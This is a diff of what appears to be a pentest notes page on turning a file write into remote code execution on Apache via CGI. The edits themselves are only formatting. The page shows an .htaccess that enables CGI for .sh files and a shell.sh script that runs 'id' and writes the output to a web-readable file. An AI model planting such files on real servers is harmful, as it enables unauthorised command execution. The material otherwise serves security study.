@@ -19,7 +19,6 @@ toc: true
 
 ## File Write to RCE via CGI
 
-
 In order to get your CGI programs to work properly, you'll need to have Apache configured to permit CGI execution.
 
 ```bash
@@ -30,14 +29,14 @@ LoadModule cgi_module modules/mod_cgi.so
 
 File `/var/www/html/.htaccess`:
 
-```
+```bash
 Options +ExecCGI
 AddHandler cgi-script .sh
 ```
 
 File `/var/www/html/shell.sh`:
 
-```sh
+```bash
 #!/bin/sh
 echo -ne "Content-Type: text/html\n\n"
 id > /var/www/html/static/output.png
